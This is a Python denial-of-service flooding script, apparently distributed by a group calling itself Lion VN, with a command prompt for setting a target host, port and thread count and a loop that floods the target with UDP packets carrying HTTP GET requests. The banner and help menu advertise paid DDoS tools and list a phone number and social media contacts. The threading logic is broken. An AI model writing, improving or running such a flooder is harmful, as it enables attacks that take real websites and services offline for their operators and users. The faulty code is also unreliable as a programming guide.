import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style

class SockFlood:
	def __init__(self):
		os.system("cls")
		os.system("title LionVN - King DDoS VIP PRO ")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""
		
		
		
		
		
		
		Copyright By : Team Lion VN - DDoS Pro 
		Zalo Contact : 0792161421
		Sever Discord : https://discord.gg/VGJXb9Rf 
		Ngày Ra Mắt Tool - 30.8.2022  
		"""
		print(Fore.RED+banner)
		print(Fore.YELLOW+"""
		[+] Bản Quyền Tool Thuộc LionVN (Nguyễn Nhật Quyền) [+]"""+Fore.GREEN+"""
		[+] Zalo Hỗ Trợ : 0792161421""")
		print(Fore.WHITE+"""
		[+] Sử Dụng Lệnh "help" Để Xem Cách Sử Dụng [+]
			""")

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
		except Exception as e:
			print(Fore.RED+f"""
	[-] Socket ERROR! Fatal X_X
	[-] EXCEPTION : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Fore.WHITE+"""
	LionVN Xin Chào Mừng Bạn Tới Help Menu 

	(+) Cách Sử Dụng Đơn Giản Hiệu Quả
	(+) Hỗ Trợ Tạo Tool DDoS + BOT DDoS 
	(+) Zalo : 0792161421 
	(+) Facebook : https://www.facebook.com/nhatquyen.artvn/
	(+) Cách SD LionV4 (VD) : host nhatquyenit.net port 443 or 80 attacks 1000 start
	""")
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[+] Successfully Set Host as {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Port to {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Threads to {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()